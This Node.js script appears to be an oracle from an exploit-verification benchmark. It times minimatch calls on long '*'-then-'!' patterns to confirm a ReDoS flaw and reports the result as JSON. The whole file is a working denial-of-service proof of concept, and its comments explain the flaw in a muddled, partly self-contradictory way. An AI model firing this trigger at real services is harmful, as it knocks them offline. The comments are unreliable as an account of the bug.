'use strict';
const minimatch = require('minimatch');

function main() {
  try {
    // --- Benign operation first: prove basic matching works ---
    const benignPositive = minimatch('index.js', '*.js');
    const benignNegative = minimatch('index.txt', '*.js');

    if (benignPositive !== true || benignNegative !== false) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign minimatch operation did not return expected result.'
      }));
      return;
    }

    const operation_completed = true;

    // --- Malicious input: known minimatch <=3.0.4 ReDoS trigger ---
    // The vulnerable `path.makeRe` -> comment/negation pattern handling in
    // minimatch's `expand` regex (used for patterns made of many repeated
    // groups of '*' nested inside parentheses/braces) triggers catastrophic
    // backtracking because the generated regular expression contains
    // nested quantifiers like `((?:[^/]*?)*?)*` style constructs. This is
    // the canonical published PoC used in CVE-2016-10540 / later ReDoS
    // advisories for minimatch: a pattern of many repeated '*' characters
    // combined with a long non-matching subject string. On vulnerable
    // versions this causes exponential-time backtracking in the
    // generated RegExp.exec call; on patched versions (>=3.0.5) the regex
    // construction was fixed to avoid the nested quantifier blowup.
    //
    // Sizes are kept bounded so even the vulnerable path finishes within
    // a few seconds, while timing differences between vulnerable and
    // patched behavior remain clearly distinguishable.
    function buildPattern(n) {
      // Many repeated '*' groups inside a single path segment force the
      // expand() routine to build a regex with repeated '.*' groups that
      // can backtrack catastrophically against a long non-matching tail.
      return '*'.repeat(n) + '!';
    }
    function buildSubject(n) {
      // A long run of a character that never matches the trailing '!'
      // forces maximal backtracking across all the '*' groups.
      return 'a'.repeat(n);
    }

    const sizes = [1000, 5000, 10000, 20000, 30000, 40000];
    const THRESHOLD_MS = 1500;
    let exploit_succeeded = false;
    let lastElapsed = 0;
    let lastN = 0;
    let lastSubjectLen = 0;
    let lastMatched;
    let threw = false;
    let thrownMessage = '';

    for (const n of sizes) {
      const pattern = buildPattern(n);
      const subject = buildSubject(n);
      const start = Date.now();
      let matched;
      try {
        matched = minimatch(subject, pattern);
      } catch (innerErr) {
        threw = true;
        thrownMessage = String(innerErr && innerErr.message);
        lastElapsed = Date.now() - start;
        lastN = n;
        lastSubjectLen = subject.length;
        break;
      }
      const elapsed = Date.now() - start;
      lastElapsed = elapsed;
      lastN = n;
      lastSubjectLen = subject.length;
      lastMatched = matched;

      if (elapsed >= THRESHOLD_MS) {
        exploit_succeeded = true;
        break;
      }
    }

    if (threw) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious pattern raised an exception at n=' + lastN + ' after ' + lastElapsed + 'ms: ' + thrownMessage
      }));
      return;
    }

    const evidence = 'Malicious minimatch call (last tested n=' + lastN + ', subjectLen=' + lastSubjectLen +
      ') completed in ' + lastElapsed + 'ms (threshold ' + THRESHOLD_MS + 'ms). Result=' + lastMatched +
      '. exploit_succeeded=' + exploit_succeeded;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.message)
    }));
  }
}

main();
